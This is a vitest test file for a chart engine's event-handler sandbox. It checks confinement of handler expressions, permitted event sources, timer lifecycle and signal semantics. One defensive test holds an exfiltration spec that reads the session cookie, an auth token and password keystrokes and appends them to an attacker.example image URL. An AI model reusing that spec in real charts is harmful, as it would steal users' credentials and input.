// @vitest-environment jsdom
/**
 * The event loop's confinement and lifecycle (2026-11-22 audit, DECISIONS Q1):
 *  - C4: a handler expression gets a read-only facade of the event; every value reachable from it, by every path an expression can
 *    read, belongs to the chart (no node, window, document, event, storage, location or navigator), for every kind of source;
 *    and the exfiltration scenario of the audit leaks nothing;
 *  - C78: window and selector sources are bound only as far as the host and `config.events` allow;
 *  - C40: what outlives a binding is the chart's, not its text's: a different chart on the same owner starts afresh;
 *  - C271, C388: a timer follows the chart that is shown, whatever the owner is, and stops when nothing shows it;
 *  - C290: `{scale}` sources fire for a host that replaces its element;
 *  - C270: `setSignal` is vega's `view.signal`: no change, no run; an undeclared name throws;
 *  - C99: a `modify` that feeds itself ends promptly, at the clock or at the bound on propagations, not on the stack.
 */
import { afterEach, describe, expect, it } from 'vitest'
import { compileChart, evaluateChart, renderSceneToSvg } from './index.js'
import { bindSceneSignals, type SignalBinding } from './signals.js'
import { setTimerClock, timers } from './timer.js'
import { FakeClock } from './timer.testlib.js'
import { safeGet } from './util.js'
import { buildHitIndex } from './entry-hit.js'
import { DisallowedObjectProperties } from './util.js'
import type { VgSpec } from './types.js'

const opened: SignalBinding[] = []
let clock: FakeClock | null = null
/** A controlled clock for the timer streams (flushed after the test, as signals.timer.test.tsx does, so none stays armed). */
const useClock = (frame: number): FakeClock => (clock = new FakeClock(frame), setTimerClock(clock), clock)
afterEach(() => {
  for (const b of opened.splice(0)) b.release()
  if (clock) {
    clock.advance(10_000)
    expect(timers.pending()).toBe(0)
    clock = null
  }
  setTimerClock(null)
  document.body.innerHTML = ''
  document.cookie = 'session=; expires=Thu, 01 Jan 1970 00:00:00 GMT'
})

const rectMark = { type: 'rect', name: 'r', from: { data: 't' }, encode: { update: { x: { value: 0 }, y: { value: 0 }, width: { value: 100 }, height: { value: 60 }, fill: { value: 'red' } } } }
const specOf = (signals: unknown[], extra: Record<string, unknown> = {}): VgSpec => ({
  width: 100, height: 60, padding: 0, autosize: 'none', signals, data: [{ name: 't', values: [{ v: 1, s: 'a' }] }], marks: [rectMark], ...extra,
}) as unknown as VgSpec

interface Mounted { host: HTMLElement; svg: SVGSVGElement; store: Record<string, unknown>; logs: string[]; binding: SignalBinding }
function mount(spec: VgSpec, opts: Parameters<typeof bindSceneSignals>[4] = {}, chart = compileChart(spec)): Mounted {
  const host = document.createElement('div')
  document.body.appendChild(host)
  const scene = evaluateChart(chart)
  host.innerHTML = renderSceneToSvg(scene)
  const svg = host.querySelector('svg') as SVGSVGElement
  svg.getBoundingClientRect = () => ({ left: 0, top: 0, right: 100, bottom: 60, width: 100, height: 60, x: 0, y: 0 } as DOMRect)
  const store: Record<string, unknown> = {}
  const logs: string[] = []
  const binding = bindSceneSignals(svg, scene, store, { logger: { error: (...a) => logs.push('error:' + a.join(' ')), warn: (...a) => logs.push('warn:' + a.join(' ')) } },
    { pick: buildHitIndex(scene).query, ...opts })
  opened.push(binding)
  return { host, svg, store, logs, binding }
}

/** Whether a value belongs to the page (or is a way to it) rather than to the chart. */
function isPage(v: unknown): boolean {
  if (v === null || (typeof v !== 'object' && typeof v !== 'function')) return false
  return v === window || v === document || v === globalThis || v instanceof EventTarget || v instanceof Event
    || v instanceof Location || v instanceof Navigator || v instanceof Storage || v instanceof History
    || (typeof v === 'function' && (v === fetch || v === eval || v === Function || v === setTimeout || v === XMLHttpRequest || v === window.open))
}

/** The built-in prototypes: their members are the language's, reached from any value, and are no part of the page. */
const BUILTIN_PROTOS = new Set<unknown>([Object.prototype, Array.prototype, Function.prototype, String.prototype, Number.prototype, Boolean.prototype, Date.prototype, RegExp.prototype, Map.prototype, Set.prototype, Symbol.prototype, Error.prototype])

/** A member read as the engine's expressions make it (expr-interpreter.ts `member`, engine reading). */
function memberRead(o: unknown, key: string): unknown {
  if (o === null || o === undefined) return undefined
  if (typeof o === 'function' && key === 'prototype') return undefined
  return safeGet(o, key)
}

/** Every value an expression can reach from `root` by member reads (every string key, own or inherited below the built-ins). */
function reachable(root: unknown, limit = 200_000): Array<{ path: string; value: unknown }> {
  const out: Array<{ path: string; value: unknown }> = []
  const seen = new Set<unknown>()
  const queue: Array<{ path: string; value: unknown }> = [{ path: 'event', value: root }]
  while (queue.length && out.length < limit) {
    const { path, value } = queue.shift()!
    out.push({ path, value })
    if (value === null || (typeof value !== 'object' && typeof value !== 'function') || seen.has(value)) continue
    seen.add(value)
    const keys = new Set<string>()
    for (let o: unknown = value; o !== null && o !== undefined && !BUILTIN_PROTOS.has(o); o = Object.getPrototypeOf(o)) {
      for (const k of Object.getOwnPropertyNames(o)) keys.add(k)
    }
    for (const k of [...keys, ...DisallowedObjectProperties, 'prototype']) {
      let v: unknown
      try { v = memberRead(value, k) } catch { continue }
      if (v !== undefined) queue.push({ path: `${path}.${k}`, value: v })
    }
  }
  return out
}

describe('C4: a handler expression reaches nothing of the page', () => {
  /** Signals that keep the event an expression sees, for each kind of source and event. */
  const capture = [
    { name: 'click', value: null, on: [{ events: '@r:click', update: 'event' }] },
    { name: 'wheel', value: null, on: [{ events: 'wheel', update: 'event' }] },
    { name: 'key', value: null, on: [{ events: 'keydown', update: 'event' }] },
    { name: 'touch', value: null, on: [{ events: 'touchstart', update: 'event' }] },
    { name: 'pointer', value: null, on: [{ events: 'pointerdown', update: 'event' }] },
    { name: 'win', value: null, on: [{ events: 'window:pointermove', update: 'event' }] },
    { name: 'resize', value: null, on: [{ events: 'window:resize', update: 'event' }] },
    { name: 'tick', value: null, on: [{ events: 'timer{20}', update: 'event' }] },
    { name: 'filtered', value: null, on: [{ events: 'mousemove[event.clientX > 0]', update: 'event' }] },
    { name: 'between', value: null, on: [{ events: '[mousedown, mouseup] > mousemove', update: 'event' }] },
  ]
  it('for every source kind, every value reachable from `event` belongs to the chart', () => {
    const clock = useClock(16)
    const m = mount(specOf(capture), { eventSources: { window: true, selector: true } })
    const path = m.svg.querySelector('.mark-rect path')!
    path.dispatchEvent(new MouseEvent('click', { bubbles: true, clientX: 5, clientY: 5 }))
    m.svg.dispatchEvent(new WheelEvent('wheel', { bubbles: true, deltaY: 3, clientX: 5, clientY: 5 }))
    m.svg.dispatchEvent(new KeyboardEvent('keydown', { bubbles: true, key: 'k' }))
    const touch = { identifier: 1, clientX: 4, clientY: 4, target: path } as unknown as Touch
    const te = new Event('touchstart', { bubbles: true }) as TouchEvent
    Object.defineProperty(te, 'touches', { value: [touch] })
    Object.defineProperty(te, 'changedTouches', { value: [touch] })
    m.svg.dispatchEvent(te)
    m.svg.dispatchEvent(new MouseEvent('pointerdown', { bubbles: true, clientX: 6, clientY: 6 }))
    window.dispatchEvent(new MouseEvent('pointermove', { clientX: 300, clientY: 300 }))
    window.dispatchEvent(new Event('resize'))
    clock.advance(50)
    m.svg.dispatchEvent(new MouseEvent('mousemove', { bubbles: true, clientX: 7, clientY: 7 }))
    m.svg.dispatchEvent(new MouseEvent('mousedown', { bubbles: true, clientX: 7, clientY: 7 }))
    m.svg.dispatchEvent(new MouseEvent('mousemove', { bubbles: true, clientX: 8, clientY: 8 }))
    let paths = 0
    for (const { name } of capture) {
      const facade = m.store[name]
      expect(facade, name).toBeTruthy()
      for (const { path: p, value } of reachable(facade)) {
        paths++
        if (isPage(value)) throw new Error(`${name}: ${p} reaches the page`)
      }
      for (const k of ['view', 'target', 'currentTarget', 'srcElement', 'relatedTarget', 'composedPath', 'preventDefault', 'stopPropagation', 'path', 'constructor', '__proto__']) {
        expect(memberRead(facade, k), `${name}: event.${k}`).toBeUndefined()
      }
    }
    expect(paths).toBeGreaterThan(200)
    // what the facade does carry: the values vega's expressions read
    expect((m.store.wheel as Record<string, unknown>).deltaY).toBe(3)
    expect((m.store.key as Record<string, unknown>).key).toBe('k')
    expect(((m.store.touch as Record<string, unknown[]>).touches[0] as Record<string, unknown>).clientX).toBe(4)
    expect(((m.store.click as Record<string, { datum: unknown }>).item.datum as Record<string, unknown>).v).toBe(1)
    expect(typeof (m.store.tick as Record<string, unknown>).elapsed).toBe('number')
    expect(Object.isFrozen(m.store.click)).toBe(true)
  })

  it('the audit\'s exfiltration spec leaks nothing (t2-exfil): no cookie, storage, page field or keystroke reaches a signal or a url', () => {
    document.cookie = 'session=SECRET123'
    ;(window as unknown as { authToken: string }).authToken = 'TOKEN-abc'
    const pw = document.createElement('input')
    pw.id = 'pw'
    document.body.appendChild(pw)
    const spec = specOf([
      { name: 'leak', value: '', on: [{ events: 'window:mousemove', update: "event.view.document.cookie + '|' + event.view.authToken" }] },
      { name: 'leak2', value: '', on: [{ events: 'mousemove', update: "'' + event.target.ownerDocument.cookie" }] },
      { name: 'keys', value: '', on: [{ events: { source: '#pw', type: 'input' }, update: 'event.target.value' }] },
      { name: 'keys2', value: '', on: [{ events: 'window:keydown', update: 'keys2 + event.key' }] },
    ], { marks: [rectMark, { type: 'image', encode: { update: { url: { signal: "'https://attacker.example/p.gif?c=' + leak + leak2 + keys + keys2" } } } }] })
    const m = mount(spec)
    window.dispatchEvent(new MouseEvent('mousemove', { clientX: 1, clientY: 1 }))
    m.svg.dispatchEvent(new MouseEvent('mousemove', { bubbles: true, clientX: 1, clientY: 1 }))
    pw.value = 'hunter2'
    pw.dispatchEvent(new Event('input', { bubbles: true }))
    window.dispatchEvent(new KeyboardEvent('keydown', { key: 'x' }))
    const text = JSON.stringify(m.store)
    expect(text).not.toMatch(/SECRET|TOKEN|hunter2/)
    expect(m.store.keys).toBeUndefined()
    expect(m.store.keys2).toBeUndefined()
    // the reads off a missing `view` / `target` fail in the handler and are reported; the selector and the key source are not bound
    expect(m.logs.some((l) => /Blocked selector input event listener/.test(l))).toBe(true)
    expect(m.logs.some((l) => /Blocked window keydown event listener/.test(l))).toBe(true)
    delete (window as unknown as { authToken?: string }).authToken
  })
})

describe('C78: config.events and the host decide which sources are bound', () => {
  const handlers = [
    { name: 'v', value: 0, on: [{ events: 'click', update: 'v + 1' }] },
    { name: 'w', value: 0, on: [{ events: 'window:pointermove', update: 'w + 1' }] },
    { name: 'k', value: 0, on: [{ events: 'window:keydown', update: 'k + 1' }] },
    { name: 's', value: 0, on: [{ events: { source: 'body', type: 'mousedown' }, update: 's + 1' }] },
    { name: 't', value: 0, on: [{ events: 'timer{10}', update: 't + 1' }] },
  ]
  const fireAll = (m: Mounted, clock: FakeClock): number[] => {
    m.svg.querySelector('.mark-rect path')!.dispatchEvent(new MouseEvent('click', { bubbles: true, clientX: 5, clientY: 5 }))
    window.dispatchEvent(new MouseEvent('pointermove'))
    window.dispatchEvent(new KeyboardEvent('keydown', { key: 'a' }))
    document.body.dispatchEvent(new MouseEvent('mousedown', { bubbles: true }))
    clock.advance(40)
    return ['v', 'w', 'k', 's', 't'].map((n) => Math.min(1, (m.store[n] as number | undefined) ?? 0))
  }
  it.each([
    ['the host default: view, timer, window pointer moves', undefined, undefined, [1, 1, 0, 0, 1]],
    ['a host that allows every source', undefined, { window: true, selector: true }, [1, 1, 1, 1, 1]],
    ['config.events blocks everything', { view: false, window: false, selector: false, timer: false }, { window: true, selector: true }, [0, 0, 0, 0, 0]],
    ['config.events lists types', { view: ['mousedown'], window: ['keydown'], selector: [] }, { window: true, selector: true }, [0, 0, 1, 0, 1]],
    ['config.events cannot widen the host', { window: true, selector: true }, undefined, [1, 1, 0, 0, 1]],
  ])('%s', (_label, events, eventSources, want) => {
    const clock = useClock(16)
    const m = mount(specOf(handlers, events ? { config: { events } } : {}), eventSources ? { eventSources } : {})
    expect(fireAll(m, clock)).toEqual(want)
    // a blocked listener is told once, as vega tells it when the view is built
    const blocked = m.logs.filter((l) => l.includes('Blocked'))
    expect(new Set(blocked).size).toBe(blocked.length)
  })
})

describe('C40: what outlives a binding is the chart\'s', () => {
  const spec = specOf([
    { name: 'a', value: 0, on: [{ events: 'click', update: '5' }] },
    { name: 'n', value: 0, on: [{ events: { signal: 'a' }, update: 'a * 2' }] },
    { name: 'm', update: 'n + 1' },
  ])
  it('a second chart of the same spec on the same owner, after detach only, starts as a fresh chart does', () => {
    const host = document.createElement('div')
    document.body.appendChild(host)
    const run = (): Record<string, unknown> => {
      const chart = compileChart(spec)
      const scene = evaluateChart(chart)
      host.innerHTML = renderSceneToSvg(scene)
      const svg = host.querySelector('svg')!
      svg.getBoundingClientRect = () => ({ left: 0, top: 0, width: 100, height: 60 } as DOMRect)
      const store: Record<string, unknown> = {}
      const b = bindSceneSignals(svg, scene, store, {}, { owner: host })
      svg.querySelector('.mark-rect path')!.dispatchEvent(new MouseEvent('click', { bubbles: true, clientX: 5, clientY: 5 }))
      b.detach()
      return store
    }
    const first = run()
    const second = run()
    expect(second).toEqual(first)
    expect(first).toEqual({ a: 5, n: 10, m: 11 })
  })

  it('timers of earlier charts on an owner stop when another chart binds to it; release forgets the streams', () => {
    const clock = useClock(16)
    const host = document.createElement('div')
    document.body.appendChild(host)
    for (let i = 1; i <= 6; i++) {
      const chart = compileChart(specOf([{ name: 'n', value: 0, on: [{ events: `timer{${i * 10}}`, update: 'n + 1' }] }]))
      const scene = evaluateChart(chart)
      host.innerHTML = renderSceneToSvg(scene)
      bindSceneSignals(host.querySelector('svg')!, scene, {}, {}, { owner: host }).detach()
    }
    expect(timers.pending()).toBe(1)
    const chart = compileChart(specOf([{ name: 'drag', value: 0, on: [{ events: '[mousedown, mouseup] > mousemove', update: 'drag + 1' }] }]))
    const scene = evaluateChart(chart)
    host.innerHTML = renderSceneToSvg(scene)
    const svg = host.querySelector('svg')!
    const store: Record<string, unknown> = {}
    const b1 = bindSceneSignals(svg, scene, store, {}, { owner: host })
    svg.dispatchEvent(new MouseEvent('mousedown', { bubbles: true }))
    b1.release()
    expect(timers.pending()).toBe(0)
    const b2 = bindSceneSignals(svg, scene, store, {}, { owner: host })
    opened.push(b2)
    svg.dispatchEvent(new MouseEvent('mousemove', { bubbles: true }))
    // (vega: finalize and a new view; no drag without a mousedown in it)
    expect(store.drag).toBeUndefined()
  })
})

describe('C271, C388: a timer follows the chart that is shown', () => {
  const tickSpec = specOf([{ name: 'tick', value: 0, on: [{ events: 'timer{10}', update: 'tick + 1' }] }])
  it('an owner that is not a node keeps the timer of a host that replaces its element on every render', () => {
    const clock = useClock(5)
    const owner = new EventTarget()
    const host = document.createElement('div')
    document.body.appendChild(host)
    const chart = compileChart(tickSpec)
    const store: Record<string, unknown> = {}
    let binding: SignalBinding | null = null
    let dirty = false
    const render = (): void => {
      binding?.detach()
      dirty = false
      const scene = evaluateChart(chart, { signals: store })
      host.innerHTML = renderSceneToSvg(scene) // a new element every render
      binding = bindSceneSignals(host.querySelector('svg')!, scene, store, { onSignal: () => { dirty = true } }, { owner })
    }
    render()
    for (let i = 0; i < 30; i++) {
      clock.advance(10)
      if (dirty) render()
    }
    expect(store.tick as number).toBeGreaterThanOrEqual(20)
    expect(timers.pending()).toBe(1)
    binding!.release()
    expect(timers.pending()).toBe(0)
  })

  it('a timer of an element that was never shown stops once nothing is bound to it', () => {
    const clock = useClock(5)
    const chart = compileChart(tickSpec)
    const scene = evaluateChart(chart)
    const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg') // never in the document
    const store: Record<string, unknown> = {}
    const b = bindSceneSignals(svg, scene, store)
    clock.advance(25)
    expect(store.tick).toBeGreaterThan(0) // a live binding of a detached element still ticks (headless use)
    b.detach()
    expect(timers.pending()).toBe(1)
    clock.advance(25)
    expect(timers.pending()).toBe(0)
  })
})

describe('C290: a {scale} source fires for a host that replaces its element', () => {
  it('compares the scales with those the owner saw last', () => {
    const spec = specOf([
      { name: 'hi', value: 10, on: [{ events: 'click', update: 'hi * 2' }] },
      { name: 'n', value: 0, on: [{ events: { scale: 'x' }, update: 'n + 1' }] },
    ], { scales: [{ name: 'x', type: 'linear', domain: [0, { signal: 'hi' }], range: 'width' }] })
    const chart = compileChart(spec)
    const host = document.createElement('div')
    document.body.appendChild(host)
    const store: Record<string, unknown> = {}
    let binding: SignalBinding | null = null
    const render = (): void => {
      binding?.detach()
      const scene = evaluateChart(chart, { signals: store })
      host.innerHTML = renderSceneToSvg(scene)
      binding = bindSceneSignals(host.querySelector('svg')!, scene, store, {}, { owner: host })
      opened.push(binding)
    }
    render()
    for (let i = 1; i <= 2; i++) {
      host.querySelector('.mark-rect path')!.dispatchEvent(new MouseEvent('click', { bubbles: true, clientX: 5, clientY: 5 }))
      render()
      expect(store.n).toBe(i)
    }
  })
})

describe('C270: setSignal is vega\'s view.signal', () => {
  const spec = specOf([{ name: 'a', value: 1 }, { name: 'n', value: 0, on: [{ events: { signal: 'a' }, update: 'n + 1' }] }, { name: 'd', update: 'a * 2' }])
  it('the current value changes nothing; another value or force runs the dependents; an undeclared name throws', () => {
    const m = mount(spec)
    const seen: string[] = []
    const b = bindSceneSignals(m.svg, evaluateChart(compileChart(spec)), m.store, { onSignal: (k) => seen.push(k) })
    opened.push(b)
    b.setSignal('a', 1)
    expect(m.store.n).toBeUndefined()
    expect(seen).toEqual([])
    b.setSignal('a', 2)
    expect(m.store.n).toBe(1)
    b.setSignal('a', 2, { force: true })
    expect(m.store.n).toBe(2)
    expect(() => b.setSignal('nope', 5)).toThrow('Unrecognized signal name: "nope"')
    expect(() => b.setSignal('__proto__', {})).toThrow('Unrecognized signal name')
    b.setSignal('width', 50) // a view signal is a signal
    expect(m.store.width).toBe(50)
  })
})

describe('C99: a modify that feeds itself ends promptly', () => {
  const spec = specOf([
    { name: 'go', value: false, on: [{ events: 'click', update: 'true' }] },
    { name: 'grow', value: 0, update: "go ? modify('t', {v: length(data('t'))}) + length(data('t')) : 0" },
  ])
  it.each([
    ['no limits (the bound on propagations)', undefined, /more than 1000 propagations/],
    ['maxTimeMs', { maxTimeMs: 100 }, /maxTimeMs|more than 1000 propagations/],
    ['maxRows', { maxRows: 100 }, /maxRows/],
  ])('%s', (_label, limits, message) => {
    const chart = compileChart(spec)
    const scene = evaluateChart(chart, limits ? { limits } : {})
    const host = document.createElement('div')
    document.body.appendChild(host)
    host.innerHTML = renderSceneToSvg(scene)
    const svg = host.querySelector('svg')!
    const errors: string[] = []
    let rows = 0
    const b = bindSceneSignals(svg, scene, {}, { logger: { error: (m) => errors.push(String(m)), warn: () => {} }, onData: (_n, r) => { rows = r.length } })
    opened.push(b)
    const t0 = performance.now()
    svg.dispatchEvent(new MouseEvent('click', { bubbles: true, clientX: 5, clientY: 5 }))
    expect(performance.now() - t0).toBeLessThan(5_000)
    expect(errors.join('\n')).toMatch(message)
    expect(errors.join('\n')).not.toMatch(/call stack/)
    if (limits && 'maxRows' in limits) expect(rows).toBeLessThanOrEqual(100)
  }, 30_000)
})
